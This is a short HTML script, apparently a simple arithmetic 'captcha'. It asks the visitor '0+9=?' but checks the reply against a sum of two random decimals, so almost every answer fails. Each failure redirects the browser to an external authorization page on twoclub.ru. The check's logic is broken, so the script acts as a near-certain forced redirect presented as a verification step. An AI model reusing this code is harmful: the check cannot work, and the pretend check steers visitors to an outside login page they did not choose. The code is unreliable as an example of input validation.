<script>
	var min = 0;
	var max = 9;
  var ppz = Math.random() * (max - min) + min;
  var ppt = Math.random() * (max - min) + min;
  var primus = ppz + ppt;
  var result = prompt(min+'+'+max+'=?', 'ответ');
  if(result!=primus){
	  document.location.href = "http://twoclub.ru/autorize.php";
  }
</script>